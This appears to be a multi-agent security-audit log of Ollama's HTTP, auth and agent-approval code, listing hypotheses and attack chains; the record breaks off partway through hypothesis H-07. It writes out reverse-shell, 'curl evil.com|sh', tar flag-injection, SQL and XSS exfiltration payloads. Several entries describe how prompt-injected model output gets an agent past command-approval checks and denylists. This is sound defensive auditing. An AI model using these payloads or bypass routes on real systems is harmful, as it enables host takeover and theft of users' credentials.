# Review Chamber: chamber-04

Cluster: Privilege Transitions / HTTP / Auth / Agent — DFD-5 (HTTP handlers), DFD-9 (web_fetch/SSRF), DFD-14 ($EDITOR/tools), Trust Boundaries B10 (network→host), B11 (LLM/model→host)
DFD Slices: DFD-5, DFD-9, DFD-14, B10, B11
NNN Range: p8-060 to p8-079
Started: 2026-04-17T03:12:00Z
Status: CLOSED
Closed: 2026-04-17T18:30:00Z

Ideator: ideator-04
Tracer: tracer-04
Advocate: advocate-04

---

## Pre-Seeded Hypotheses (from Deep Probe — Group C + Group E + Group FG + SAST + Spec Gap)

The following hypotheses are already validated or strongly evidenced by the Deep Probe phase. The Ideator MUST incorporate them as H-00.* entries and build chain/variant hypotheses on top. The Tracer MUST verify on HEAD and extend existing evidence rather than re-tracing from scratch. The Advocate must search for compensating controls for each.

### Group C (HTTP / web_fetch / SSRF / auth proxy)

| Pre-Seed ID | Source | Severity | One-liner |
|-------------|--------|----------|-----------|
| H-00.01 | PH-C-01 / PH-C-02 | HIGH | `readRequestBody` uses unbounded `io.ReadAll` — every non-zstd cloud passthrough path (web_fetch, web_search, chat completions) allocates full attacker body in heap. `server/cloud_proxy.go:294`. |
| H-00.02 | PH-C-03 | HIGH | `OLLAMA_EXPERIMENT=client2` dispatches `/api/pull` and `/api/delete` via `server/internal/registry/server.go:117-121` BEFORE gin middleware chain → zero allowedHosts/auth → direct SSRF with IMDS reach. |
| H-00.03 | PH-C-04 | HIGH | `.localhost`, `.local`, `.internal` suffix match in `allowedHostsMiddleware` (`server/routes.go:1592-1603`) allows DNS rebinding: attacker registers `evil.localhost` pointing to 127.0.0.1 then flips to IMDS. |
| H-00.04 | PH-C-05 | HIGH | `/api/experimental/web_search` has no local auth — attacker on LAN or via host-bypass relays queries via victim's signing key → victim's ollama.com account charged / audited. |
| H-00.05 | PH-C-06 | MEDIUM | `/api/me` returns public key + `signin_url` — device fingerprint + phishing pivot point. |
| H-00.06 | PH-C-07 | MEDIUM | Registry realm check in `server/auth.go:53-100` enforces host equality but not scheme → `realm="http://..."` downgrades ed25519-signed auth to plaintext. |
| H-00.07 | PH-C-08 / PH-C-21 | MEDIUM | `RawQuery` forwarded verbatim from client to ollama.com → timestamp collision (`?ts=0` before signing's `ts=<unix>` append); attacker injects query params into upstream API calls. |
| H-00.08 | PH-C-10 | HIGH | `OLLAMA_HOST=0.0.0.0` makes `addr.Addr().IsUnspecified()` return true in `routes.go:1615-1618` → allowedHostsMiddleware short-circuits to accept ALL host headers (rebinding trivial). |
| H-00.09 | PH-C-12 | HIGH | `net.IP.IsPrivate()` accepts RFC1918 space — LAN rebinding with 10.x / 192.168.x host header accepted. |
| H-00.10 | PH-C-14 | HIGH | Cloud proxy zstd branch double-buffers: decompress then re-encode → 2× attacker-supplied bytes held in heap simultaneously. |
| H-00.11 | PH-C-15 | HIGH | `ResponsesMiddleware` unbounded JSON read (`server/middleware/openai.go:511-523`) — every OpenAI-compat request path. |
| H-00.12 | PH-C-16 | HIGH | `/api/pull` with `req.Insecure=true` + no host allowlist → attacker-chosen host over plain HTTP → SSRF (distinct from H-00.02 client2 path: this path goes through gin but lacks host filtering on the `model` field). |

### Group E (Agent / tools / privilege transitions)

| Pre-Seed ID | Source | Severity | One-liner |
|-------------|--------|----------|-----------|
| H-00.13 | PH-E-01 | CRITICAL | `extractBashPrefix` at `x/agent/approval.go:204` splits on `|` only — `;`, `&&`, `||`, `$()`, backticks pass through. Approval for `cat tools/file` whitelists `cat tools/file ; bash -i >& /dev/tcp/attacker/4444`. |
| H-00.14 | PH-E-02 | CRITICAL | Command substitution inside path argument (e.g. `cat tools/$(curl attacker\|sh)`) generates approval key `cat:tools/` because prefix extraction strips the `$()`. One approval = session RCE. |
| H-00.15 | PH-E-04 | CRITICAL | `--experimental-yolo` skips approval entirely; denylist uses raw string match so `r''m`, `r""m`, backslash-quoted `r\m` bypass denyword list → zero-friction RCE from prompt injection. |
| H-00.16 | PH-E-05 | CRITICAL | `ensureWebSearchPlugin` at `cmd/launch/openclaw.go:782` shells out to system `tar -xzf` without path safety → ZipSlip via malicious `@ollama/openclaw-web-search` npm package → writes `~/.ssh/authorized_keys`. |
| H-00.17 | PH-E-06 | HIGH | `$VISUAL`/`$EDITOR` parsed with `strings.Fields` then `exec.Command(args[0], args[1:]...)` (`cmd/interactive.go:677`) — env var injection: `EDITOR="code --extensionDevelopmentPath=/tmp/evil"` → flag injection into chosen editor. |
| H-00.18 | PH-E-12 DORMANT | CRITICAL if re-enabled | `autoAllowCommands` bypass in `approval.go:154` via `$(...)` — currently disabled but a single config flag restoring it re-opens RCE path. |

### Group FG (Auth / key management)

| Pre-Seed ID | Source | Severity | One-liner |
|-------------|--------|----------|-----------|
| H-00.19 | PH-FG-05 / PH-FG-20 | HIGH | `~/.ollama/id_ed25519` loaded with no mode/owner/symlink check — world-readable or attacker-symlinked key → identity theft + offline signing. |
| H-00.20 | PH-FG-10 | MEDIUM | `OLLAMA_MODELS` env injection redirects model root → multi-tenant escalation (attacker sets it to victim's dir). |
| H-00.21 | PH-FG-11 | MEDIUM | Malicious registry response can set `signin_url` → client opens attacker URL in browser → phishing. |

### SAST / Spec-Gap

| Pre-Seed ID | Source | Severity | One-liner |
|-------------|--------|----------|-----------|
| H-00.22 | SAST-SQL-01 | HIGH | `app/store/database.go:64` builds SQL via `fmt.Sprintf` — trace API → store reaches it, injection viable. |
| H-00.23 | SAST-DNS-01 | HIGH (cluster) | 31 gin routes register without `allowedHostsMiddleware` — DNS-rebinding enumeration surface; at least the three experimental routes (web_search, web_fetch, me) are network-reachable post-rebinding. |
| H-00.24 | Spec Gap 7 | HIGH | `server/auth.go:81` reads the auth challenge response body with unbounded `io.ReadAll` — malicious registry returns multi-GB body → client OOM. |

---

## Chain Seeds (for Ideator to expand into H-NN)

Attack chains that multiply impact across pre-seeds:

**CHAIN-A: "Remote identity theft of victim's ollama.com account"**
H-00.08 (OLLAMA_HOST=0.0.0.0 disables host check) OR H-00.03 (`.localhost` rebinding)
→ H-00.04 (web_search proxy unauthenticated)
→ attacker has access to every outbound request signed with victim's ed25519 key
→ H-00.19 (ed25519 key leak via perm check gap if attacker can also land a file read)
= complete takeover of ollama.com billing, quota, history

**CHAIN-B: "One prompt = instant RCE"**
Model-served prompt injection (malicious Modelfile/response) instructs the agent to run a command
→ H-00.15 (`yolo` bypass) OR H-00.13/14 (shell metachar through normal approval)
→ shell execution on host
→ H-00.17 ($EDITOR flag injection or setup persistence)
= full host compromise from a single model interaction

**CHAIN-C: "Malicious npm plugin persists on disk"**
User runs `ollama` launch (first-run auto-installs web search plugin)
→ H-00.16 (ZipSlip in `ensureWebSearchPlugin` via `tar -xzf`)
→ plants `~/.ssh/authorized_keys` or shell profile hook
= persistence pre-any-chat

**CHAIN-D: "Client2 SSRF → IMDS → cloud takeover"**
H-00.02 (client2 dispatches before middleware) + H-00.12 (`insecure=true`)
→ `POST /api/pull` with `model: "169.254.169.254:80/..."` over HTTP
→ AWS/GCP IMDS credentials exfil in error reflection
= cloud account compromise of whoever runs ollama

**CHAIN-E: "SQL injection via manifest"**
Malicious registry returns manifest whose model name contains SQL metacharacters
→ H-00.22 (`fmt.Sprintf` SQL) reached by trace/history storage
→ local data tamper or read
= local DB corruption / exfil

**CHAIN-F: "Unbounded body amplification cascade"**
H-00.24 (registry-side auth challenge unbounded)
+ H-00.01/H-00.10/H-00.11 (cloud proxy paths unbounded)
= one request collapses server; with H-00.02 the amplification point has no auth

---

## Unexplored attack classes (Ideator must pick up to 7)

Priority-ranked for the Ideator:

1. **`/api/embed`, `/api/chat`, `/api/generate` body size** — do they share `readRequestBody` or have independent unbounded readers?
2. **TLS verification defaults on cloud proxy outbound** — does `InsecureSkipVerify` leak into the cloud proxy HTTP client if the user sets any `insecure=true` flag earlier?
3. **Gin path normalization vs allowedHosts** — does `%2e%2e` in `Host` header survive net/url parse the same way as in `allowedHostsMiddleware`?
4. **WebSocket / SSE upgrade on cloud proxy** — if the response is a stream, does `readRequestBody`'s full-buffer pattern also apply to response? Streaming SSE to attacker?
5. **Web fetch SSRF with redirect chain** — does `web_fetch` follow 302s to arbitrary targets, validate scheme per hop, or cross from https→file://?
6. **Approval cache key collision** — can two semantically-different commands produce identical approval cache keys because the key is a prefix only? (e.g., `rm -rf /tmp/a` and `rm -rf /tmp/a/../etc`)
7. **$EDITOR race** — does `cmd/interactive.go:677` resolve `$EDITOR` once at startup or per-invocation? If per-invocation, a prompt-injection agent can set `os.Setenv("EDITOR", ...)` before triggering the editor.
8. **Launch-time plugin version pinning** — does `ensureWebSearchPlugin` verify npm integrity (sha256) or accept whatever the registry returns? (ZipSlip's upstream cause.)
9. **Signin_url open-redirect in browser callback** — when ollama-desktop opens the signin URL, does the returned code get POSTed back without origin check?
10. **Cross-origin on `/api/me`** — does it emit `Access-Control-Allow-Origin: *` and leak the public key cross-origin?
11. **Auth token cookie/JWT storage** — if cloud auth persists a token, where? file mode / owner check?
12. **`OLLAMA_DEBUG` / `OLLAMA_VERBOSE` output leaking ed25519 material on stderr** — do debug logs print signing keys or bearer tokens?

---

## Round 1 -- Ideation

Round opened: 2026-04-17T03:13:00Z
Directed to: ideator-04

### Charter for ideator-04

You are receiving 24 pre-validated hypotheses (H-00.01 through H-00.24) from the Deep Probe phase spanning Groups C, E, FG, SAST, and Spec-Gap. You MUST NOT re-generate these — they are already in the record. Your job is to:

1. **Incorporate the H-00.* entries as-is** (reference by ID; do not rewrite one-liners).
2. **Generate up to 7 NEW hypotheses** (H-01 through H-07 maximum) that either:
   - **Chain two or more H-00.* entries** into a higher-impact scenario (prioritize CHAIN-A through CHAIN-F above), or
   - **Extend a H-00.* bug class** to a new sink/callsite in DFD-5/9/14, or
   - **Cover an unexplored attack class** from the numbered list above.

### Priority ranking for new hypotheses

Rank by MULTIPLICATIVE impact of chains over single-sink extensions. A chain that turns MEDIUM primitives into a CRITICAL outcome is more valuable than a new MEDIUM standalone finding.

Preferred targets:
- Chain building on CHAIN-A (remote identity theft)
- Chain building on CHAIN-B (one prompt = RCE)
- Extension of H-00.13/14 (approval bypass — find a NEW path through `extractBashPrefix`)
- Extension of H-00.16 (ZipSlip — check if any other tar/unzip call has the same pattern)
- Unexplored class #4 (response streaming) — high novelty
- Unexplored class #8 (npm integrity check)

### Format for each new hypothesis

```
### H-<NN>: <title>

- **Attack class**: SSRF-chain | auth-bypass | RCE-chain | OOM-chain | approval-bypass | symlink | path-traversal | env-injection | replay | prompt-injection | new
- **Derivation**: chain of <H-00.X + H-00.Y> | extension of <H-00.X> | unexplored class #N
- **Attack input**: <concrete payload>
- **Code path (sketch)**: <entry -> ... -> sink>
- **Preconditions**: <attacker position, required config flags, network reachability>
- **Trust boundary crossed**: <network attacker (B10) | LLM/model-supplied data (B11) | local unprivileged user>
- **Security consequence**: <one paragraph, concrete>
- **Severity estimate**: CRITICAL | HIGH | MEDIUM
- **Open questions for Tracer**: <what Tracer must confirm on HEAD>
```

Hard cap: 7 new hypotheses. After 7, defer the rest to a bottom-of-section "Deferred candidates" list with one-liners only.

Write your output directly below this line in debate.md under the header `### [IDEATOR] Hypotheses -- <ISO timestamp>`.

---

## Round 2 -- Tracing

(Pending ideator-04 completion.)

### Charter for tracer-04 (to dispatch after Round 1)

For EACH H-00.* pre-seed, verify on HEAD (commit 57653b8e):
- **Confirm the line number** in the current file matches what the probe recorded; if the file/line has drifted, provide the current authoritative location.
- **Extend the evidence** with: (a) one immediate caller (so we can tell if it is reachable from a network request), (b) one callee or helper that matters for the sink semantics.
- **Attacker-control verification**: show ONE concrete request/input that reaches the sink with attacker bytes. Required for the Pre-FP gate.

For EACH new H-NN from the Ideator, trace end-to-end:
- Entrypoint (route registration / CLI flag / env read)
- Middleware chain / validators it passes through
- Sink function and precise line
- Classification: REACHABLE (with confirmed code path) | PARTIAL (some hops unverified) | UNREACHABLE (blocker found)

Write your output under `### [TRACER] Evidence -- <ISO timestamp>`.

---

## Round 3 -- Challenge

(Pending tracer-04 completion.)

### Charter for advocate-04 (to dispatch after Round 2)

For EACH hypothesis with REACHABLE or PARTIAL tracer evidence, write a defense brief searching all 5 protection layers:
1. **Input validation** at the entrypoint (middleware, `ShouldBindJSON`, scheme/host allowlist)
2. **Framework protection** (gin middleware, net/http defaults, go-http client redirect policy)
3. **Business logic validation** downstream of the sink
4. **Post-sink protection** (output encoding, error masking)
5. **Deployment-level** (default config, docs that discourage the dangerous mode, feature flag default-off)

If ANY layer blocks the attack, document which and decline the finding. If NONE block, state "no compensating control found" explicitly — this is required to authorize a VALID verdict.

Special emphasis:
- H-00.02 (client2): is the experiment flag documented as "unsafe"? Default-off? Is there any per-route guard inside the client2 dispatcher?
- H-00.08 (0.0.0.0 bind): is there a README warning / CLI warning when binding 0.0.0.0? Is auth enforced anywhere else?
- H-00.13/14 (shell metachar): is the SHELL launched via `exec.Command("sh","-c",...)` or direct `execve`? The latter would neutralize metachars.
- H-00.16 (ZipSlip): is npm package integrity verified (package-lock.json sha or Ollama's own manifest)?
- H-00.22 (SQL injection): is the store write actually reached by untrusted input, or only internal metadata?

Write your output under `### [ADVOCATE] Defense -- <ISO timestamp>`.

---

## Round 4 -- Synthesis

(Pending advocate-04 completion. Synthesizer-04 issues verdicts here.)

---

### [IDEATOR] Hypotheses -- 2026-04-17T14:50:00Z

Incorporating H-00.01 through H-00.24 as pre-seeded baseline. Below are 7 NEW hypotheses that chain pre-seeds, extend bug classes to new sinks, or cover unexplored attack classes. Priority: multiplicative cross-mode chains over standalone findings.

---

### H-01: Full remote identity theft chain — DNS rebinding → unauth web_search → ed25519 oracle via debug echo → offline registry impersonation

- **Attack class**: SSRF-chain + auth-downgrade + key-oracle + replay (Modes 1+5+6+7)
- **Derivation**: chain of H-00.03 (.localhost DNS rebinding) + H-00.04 (web_search unauth) + H-00.06 (realm http downgrade) + H-00.19 (key file perms) + H-00.21 (attacker-controlled signin_url)
- **Attack input**: (Step 1) Victim visits `http://pwn.evil-rebinder.com`, which scripts `fetch('http://pwn.evil-rebinder.com:11434/api/experimental/web_search', {method:'POST', body:JSON.stringify({query:'probe', model:'gpt-5'}), mode:'no-cors'})`. The rebinder flips A-record from attacker IP to 127.0.0.1 after first DNS resolution. Because `pwn.evil-rebinder.com` ends in NO tld of concern, attacker instead uses `pwn.localhost` with LAN DNS poisoning OR `pwn.internal` if victim is on corp DNS. (Step 2) The unauth `/api/experimental/web_search` handler signs an outbound HTTP request to ollama.com with victim's ed25519 key. (Step 3) Attacker sits on path OR hijacks DNS for `ollama.com` lookups during the `web_search` outbound call and returns `WWW-Authenticate: Bearer realm="http://pwn.internal/token",service="ollama.com"` — passes H-00.06 host-equality-not-scheme check — leaking the signed Authorization header over plaintext. (Step 4) Attacker replays captured signature within the `ts` tolerance window.
- **Code path (sketch)**: browser origin `http://evil.rebinder` → XHR to `http://pwn.internal:11434/api/experimental/web_search` → `allowedHostsMiddleware` sees `.internal` suffix, passes → `WebSearchExperimentalHandler` (no local auth) → `cloud_proxy.go:360-382 buildCloudSignatureChallenge` signs with `id_ed25519` → `getAuthorizationToken` at `server/auth.go:53-100` processes 401 → realm scheme not checked → ed25519 header goes to `http://pwn.internal/token` → MITM captures
- **Preconditions**: (a) victim runs ollama on default port (no auth); (b) attacker can cause a DNS result for `*.localhost` / `*.internal` to resolve to 127.0.0.1 (trivial in many corp DNS setups — `.internal` often served by local resolver; `.localhost` RFC6761 makes ANY browser resolve it to 127.0.0.1 WITHOUT DNS); (c) attacker can observe/MITM one outbound HTTP request to ollama.com (trivial if they also control upstream network OR via H-00.03's rebinder trick pointed at attacker after first resolution)
- **Trust boundary crossed**: B10 (network attacker drive-by browser) + B11 (cross-origin CSRF into local daemon) + ed25519 signing oracle
- **Security consequence**: Full takeover of victim's ollama.com account — attacker obtains a replayable signed challenge valid for the timestamp tolerance window; can charge API calls to victim's billing, read chat history, pull private models, enumerate keys via `/api/me`. More severe than H-00.04 alone because no inbound LAN access needed — works from any webpage victim visits.
- **Severity estimate**: CRITICAL
- **Creativity signal**: SAST cannot see this — it spans DNS layer (`.localhost` RFC6761 browser auto-resolution), the middleware suffix matcher, the unauthenticated `web_search` handler, and the realm scheme-not-checked bug in a single chain. Solo tracers miss that `.localhost` browser auto-resolution plus suffix match plus missing local auth plus realm downgrade = drive-by takeover. The key insight is that `.localhost` subdomains are resolved to 127.0.0.1 by most browsers per RFC6761 without any DNS at all — so no rebinding infrastructure required.
- **Open questions for Tracer**: (1) Does gin's Host header parsing preserve the `.localhost` suffix all the way to `allowedHost()`? (2) Is there any check on `Origin` header for `/api/experimental/web_search`? (3) Does the ts tolerance in signature validation allow a realistic replay window (seconds vs minutes)? (4) Does `WhoamiHandler` (`/api/me`) require POST and therefore CORS preflight (blocking drive-by) or can it be reached with `simple-request` content-type?

---

### H-02: `npm pack` output line injection → tar flag injection → arbitrary file overwrite via `--transform` / `--checkpoint-action=exec`

- **Attack class**: supply-chain + command-arg injection + trust-boundary (Modes 5+6+8)
- **Derivation**: extension of H-00.16 (ZipSlip surface) — but NOT ZipSlip; a distinct, higher-impact injection
- **Attack input**: Attacker publishes `@ollama/openclaw-web-search` (or squats a typo, OR MITMs npm registry since H-00.21 implies some HTTP paths allowed) with a crafted tarball whose filename — as reported by `npm pack` on stdout — is ANYTHING the malicious registry says it is (e.g., `v1.0.0.tgz\n--checkpoint=1\n--checkpoint-action=exec=sh -c 'curl attacker|sh'\n1.tgz`). `npm pack` prints the filename(s) it wrote; the attacker's response includes newline-separated extra "filenames" that are actually GNU tar flags.
- **Code path (sketch)**: `ensureWebSearchPlugin` at `cmd/launch/openclaw.go:770-786` → `pack := exec.Command(npmBin, "pack", webSearchNpmPackage, "--pack-destination", pluginDir)` → `out, _ := pack.Output()` → `tgzName := strings.TrimSpace(string(out))` — TrimSpace only trims outer whitespace, not embedded newlines — → `tgzPath := filepath.Join(pluginDir, tgzName)` → `tar := exec.Command("tar", "xzf", tgzPath, "--strip-components=1", "-C", pluginDir)`. If `tgzName` contains embedded newlines, `filepath.Join` keeps them; `exec.Command` then passes the concatenated string as ONE argument to tar. BUT — critical twist — look for whether `npm pack` prints MULTIPLE lines (it does: one per tarball, plus status lines on some versions). If `tgzName` becomes `A.tgz\nB.tgz` and ends up joined, a later `strings.Fields` or similar splits it. Even without splitting, `filepath.Join(pluginDir, "evil.tgz\n--checkpoint-action=exec...")` emits a path WITH a newline, which is a single exec arg — BUT: if the attacker pipes through a shell-wrapper OR if `exec.Command` is on Windows where CreateProcess rejoins args via `CommandLineToArgvW`, the newline-in-arg becomes a flag injection. Also relevant: some npm/tar versions interpret `-` prefixed filenames as flags. If attacker's tarball filename starts with `--`, tar treats it as a flag.
- **Preconditions**: attacker controls npm registry response OR typosquats the package OR MITMs the plain HTTP to npm (note: npm uses HTTPS by default, but corporate proxies and stale `registry` config can downgrade); first-run ollama launch; npm installed on system
- **Trust boundary crossed**: B10 (external npm registry → local host code execution); supply chain
- **Security consequence**: Arbitrary file write or code execution at launch time with user privileges. If `--checkpoint-action=exec=...` injection succeeds in tar, instant RCE. Even without checkpoint, attacker-controlled tarball filename starting with `-` passed as first positional arg to `tar xzf` can cause tar to interpret it as a flag (e.g., `--to-command=sh`) — confirmed tar flag injection primitive.
- **Severity estimate**: CRITICAL
- **Creativity signal**: Everyone focuses on ZipSlip inside the tarball. The bigger bug is that `npm pack`'s stdout — a network-influenced string — is FED as a shell argument to `tar` without `--`, without filename validation, without checking for leading `-`. This is a second-order injection: the primitive is "attacker controls filename" (via package name or registry response), which becomes "attacker controls tar flag". Requires looking at two trust boundaries (npm registry trust + exec.Command argv semantics on different platforms) that solo agents typically analyze separately.
- **Open questions for Tracer**: (1) Confirm `npm pack`'s stdout format: does it output exactly one filename line? Is there a way for a malicious registry to influence that filename string? (2) On the `tar` side: does `tar xzf "-evilfile"` interpret the dashed argument as a flag when position suggests filename? (3) Is there any validation of `tgzName` beyond `TrimSpace`? (4) Does ollama set `npm --registry=https://registry.npmjs.org/` explicitly or inherit user's `.npmrc`?

---

### H-03: Prompt-injection → agent `sed -i` edits `$HOME/.zshrc` via approval cache collision (prefix-key ambiguity)

- **Attack class**: approval-cache-collision + business-logic + second-order (Modes 1+2+4)
- **Derivation**: extension of H-00.13/14 + unexplored class #6 (approval cache key collision)
- **Attack input**: A malicious model output tells the agent: (Call 1) `sed -n '1,200p' tools/readme.md` — user approves, cache key becomes `sed:tools/`. (Call 2) `sed -i 's/exit 0/exit 0;curl evil.com|sh/' tools/../../.zshrc` — the `tools/..` prefix starts with `tools/` so the cache compares AFTER `extractBashPrefix` resolves relative paths. Because `sed` is in the `safeCommands` list (line 222 of approval.go), the prefix extracts from the traversal path; BUT `-i` flag is NOT on the prefix. Cache hit on `sed:tools/` → NO re-approval → writes `$HOME/.zshrc` on next shell.
- **Code path (sketch)**: LLM generates approved-first-then-evil sequence → `agent/approval.go:204 extractBashPrefix` splits on `|` only — does not split on `-i` flags → same prefix key → cache hit → autoApprove path → `exec.Command("sh","-c",<attacker cmd>)` → stored attack: next shell login runs attacker payload
- **Preconditions**: user runs `ollama` agent in non-yolo mode but grants one innocuous `sed` approval; model is prompt-injected (via crafted training data, RAG injection, web_search result injection, or just a hostile Modelfile)
- **Trust boundary crossed**: B11 (LLM/model-supplied data → host FS mutation) crosses into persistence boundary (shell rc files read at every new terminal)
- **Security consequence**: Persistent RCE across all future terminal sessions. Unlike H-00.13/14 (which require shell metacharacters in one command), this chain uses TWO approved commands where the second looks semantically identical to the first at the cache-key level. Crucially: `sed -i` (in-place edit) vs `sed -n` (read-only) both cache to `sed:tools/` under the current prefix extractor which ignores flags. Works even if H-00.13/14 is patched because this exploits the cache/matching layer, not the metacharacter parser.
- **Severity estimate**: CRITICAL
- **Creativity signal**: The whole approval system assumes "same prefix = same risk class". But `sed -n` (read) and `sed -i` (write) share the same prefix. Similarly `find -exec`, `grep -r --include` with backtick args, `tail` (read-only) vs `stat --format=%x` (side-effect-free). Solo agents look at one command at a time; this hypothesis requires reasoning about the equivalence classes induced by the cache key. Business-logic abuse of a legitimate feature (cache), not a parser bug.
- **Open questions for Tracer**: (1) Does `extractBashPrefix` strip `-i`/`--in-place` flags? (2) Is the approval cache keyed on full prefix including flags, or just command:path? (3) Can `..` traversal escape the prefix extraction's "reject if escapes base" check by going LATER in the path (e.g., `tools/a/../../../zshrc`)? Line 203 says "Paths with `..` traversal that escape the base directory return empty string" — does this catch subtle cases?

---

### H-04: SSE / streaming response hijack — attacker-controlled upstream streams back through cloud_proxy, XSS into browser SSE client (CORS `*`)

- **Attack class**: stored/reflected second-order + trust-boundary (Modes 4+5+6) — unexplored class #4
- **Derivation**: extension of H-00.01 (cloud_proxy buffering) + unexplored response-streaming
- **Attack input**: Attacker influences the response from ollama.com (via H-00.03 DNS rebind during outbound, or H-00.07 query-param-controlled backend behavior, or a compromised ollama.com edge). Response is `Content-Type: text/event-stream` with `data: <script>fetch('http://localhost:11434/api/show',{method:'POST',body:'{\"model\":\"x\"}'}).then(r=>r.json()).then(d=>fetch('//evil.com',{method:'POST',body:JSON.stringify(d)}))</script>`. The cloud_proxy streams the SSE verbatim into the client response. If the client is a browser with `corsConfig.AllowWildcard = true` and `AllowBrowserExtensions = true` (routes.go:1648-1649), and the origin is `*`, then the SSE payload hits a rendering context in a browser extension or ollama-ui that dangerously innerHTML's event `data` fields.
- **Code path (sketch)**: `cloud_proxy` forwarder → upstream ollama.com returns `Content-Type: text/event-stream` + attacker-influenced body → response copied back to gin `c.Writer` with `Access-Control-Allow-Origin: *` (wildcard enabled) → browser-based SSE consumer renders `data:` payloads. Also: `ResponsesMiddleware` at `middleware/openai.go:511-523` — does it sanitize SSE data before re-emitting to client?
- **Preconditions**: attacker influences upstream (via DNS rebinding, cloud_proxy MITM per H-00.07 RawQuery injection, or if the ollama.com response itself contains attacker content e.g. from web_search results reflected back); victim's client consumes SSE in HTML-rendering context (Ollama UI, VSCode extension, ChatGPT-desktop clone)
- **Trust boundary crossed**: upstream ollama.com (should be trusted) → local daemon → browser/extension UI (which treats ollama.com stream as same-origin since it's served by localhost with CORS `*`)
- **Security consequence**: XSS in the browser/extension consuming ollama's SSE streams, with same-origin access to `http://localhost:11434` (every local API). Attacker can read models list, inject prompt into `/api/chat`, read `/api/me` for key material. The `AllowWildcard = true` + `AllowBrowserExtensions = true` CORS config expands the blast radius.
- **Severity estimate**: HIGH
- **Creativity signal**: Everyone audits INPUT paths; response-side trust-boundary confusion is under-examined. SAST doesn't model browser rendering. The key insight is that localhost-served SSE inherits `*` CORS and therefore ANY consumer (browser extension, electron-wrapped UI) treats local daemon output as first-party. The cloud_proxy's job is to pass bytes — but who checks that upstream bytes are safe to render?
- **Open questions for Tracer**: (1) Does `ResponsesMiddleware` sanitize `data:` content before passing to client? (2) Is `corsConfig.AllowOrigins` in practice `*` by default, or is `envconfig.AllowedOrigins()` restrictive? (3) Does cloud_proxy set `X-Content-Type-Options: nosniff`? (4) Does `AllowBrowserExtensions` open the bypass Chrome extensions use?

---

### H-05: Concurrent approval race (TOCTOU on approvedPrefixes map) — prompt-injected agent queues two commands; second one races past approval check

- **Attack class**: race/TOCTOU + approval-bypass (Mode 3+7)
- **Derivation**: extension of H-00.13/14 — targets the approval flow's concurrency model, not its parser
- **Attack input**: Agent's LLM is prompt-injected to emit TWO tool_calls in a single turn: `cmd1="cat tools/readme.md"` (approved, caches `cat:tools/`) and `cmd2="curl attacker.com/payload|sh"`. Between approval-granted for cmd1 and the approval-check for cmd2, if the agent runner dispatches commands concurrently (goroutine per tool_call) AND the cache write for cmd1 happens BEFORE cmd2's cache read, cmd2 might find cmd1's cache entry IF the `extractBashPrefix(cmd2)` accidentally matches (e.g., cmd2 is `cat tools/a.md; curl evil|sh` — H-00.13 bug — or the cache is shared by command CLASS not full string).
- **Code path (sketch)**: `agent/approval.go:402,467,507` — three call sites to `extractBashPrefix`. Find the approval loop: if approval decision is cached in a shared map without a mutex, concurrent tool_calls race. Attacker goal: command B reads state BEFORE command A's approval has returned the "ask user" decision but AFTER A's pre-emptive write to the cache.
- **Preconditions**: agent dispatches multiple tool_calls concurrently; approval store is a Go map without sync (or with a coarse lock held only around read, not read-then-decide); LLM prompt-injected to emit dual calls
- **Trust boundary crossed**: B11 (model → host); additionally an intra-process race between goroutines with different trust provenance
- **Security consequence**: Second command executes WITHOUT approval prompt because the shared approval map is consulted before the user has decided. In the limit, user sees only ONE approval prompt but TWO commands run. Extension: pattern-cache poisoning where the attacker-chosen prefix is optimistically written before user consent.
- **Severity estimate**: HIGH
- **Creativity signal**: Classic TOCTOU disguised as a UX bug. Requires knowing the agent's dispatch model (serial vs parallel tool_calls) — a detail not in SAST. Also requires lateral thinking: "approval cache" sounds like a correctness cache, but it's also a race target.
- **Open questions for Tracer**: (1) Is the approval decision cached in a `sync.Map` or plain `map[string]bool`? (2) Does the agent's tool-call loop run sequentially or in goroutines? (3) Is there a mutex covering both cache-check and user-prompt? (4) What exact file/line holds the approvedPrefixes state?

---

### H-06: `OLLAMA_HOST=0.0.0.0` + SQL injection via pull manifest → stored cross-user data read via `/api/tags`

- **Attack class**: SQL-injection + stored + cross-boundary (Modes 1+4+5)
- **Derivation**: chain of H-00.08 (0.0.0.0 disables host check) + H-00.22 (SQL injection in app/store) + H-00.20 (OLLAMA_MODELS redirect)
- **Attack input**: (Step 1) Remote attacker (LAN or rebind) hits `POST /api/pull` with `{"name":"evil.com/u' UNION SELECT id,key,value FROM user_settings WHERE '1'='1:tag"}`. Pull fails on network but the manifest name is logged/stored to sqlite via `fmt.Sprintf`-constructed SQL at `app/store/database.go:64`. (Step 2) On the next `/api/tags` or `/api/show` call, the stored name re-enters SQL context → UNION pulls other users' data. Mix with H-00.20: an operator sharing $OLLAMA_MODELS across two user accounts = cross-user exfil without co-tenancy on the daemon itself.
- **Code path (sketch)**: `/api/pull` → model-name parsing (isValidPart allows letters/digits/dots/etc — need to check colon/apostrophe policy) → `storeTrace` or similar → `fmt.Sprintf("INSERT INTO ... VALUES ('%s', ...)", modelName)` → SQL injection writes attacker-controlled SQL fragment to metadata → next select composes the attack. Second-order because the dangerous SQL context is AFTER the pull failure.
- **Preconditions**: `OLLAMA_HOST=0.0.0.0`; shared database (not per-user isolation); `app/store/database.go:64` reached by pull-side error handler or by tags listing; model name allows `'` (apostrophe) or `;` through whatever validator runs
- **Trust boundary crossed**: B10 (remote network attacker) + store trust boundary (SQL context) + cross-user (if DB is shared)
- **Security consequence**: Stored SQL injection exfil of other users' settings/keys/history on shared installs (enterprise, ollama-as-a-service gateway). Even on single-user install, attacker can corrupt the DB to insert phantom models pointing at malicious registries, preparing for H-00.02/H-00.12 SSRF chain.
- **Severity estimate**: HIGH
- **Creativity signal**: Pulls SQL injection out of its usual "query parameter" frame and into "stored model metadata consumed later". The chain spans network reachability (H-00.08) → validator gap on name (`isValidPart` tolerances) → Sprintf sink → second-order read. SAST sees the Sprintf site but not whether user input actually reaches it through the pull-error-logging path.
- **Open questions for Tracer**: (1) Confirm `isValidPart` treats `'` (apostrophe) as invalid — if YES, this is blunted. (2) Confirm the exact code path from `PullHandler` error to `app/store/database.go:64` — is it reached on parse failure, on network failure, or only on successful pulls? (3) Is `app/store` the same DB as chat history, or separate? (4) Does the store have any parameterized query usage elsewhere that could serve as an easier sink?

---

### H-07: Malicious registry's `signin_url` + MITM `WWW-Authenticate` realm → phishing that steals real ollama.com cookies via HTTP-downgraded realm

- **Attack class**: phishing-chain + auth-downgrade + trust-boundary (Modes 5+6+7)
- **Derivation**: chain of H-00.21 (registry-controlled signin_url) + H-00.06 (realm http downgrade) + unexplored class #9 (signin_url open redirect)
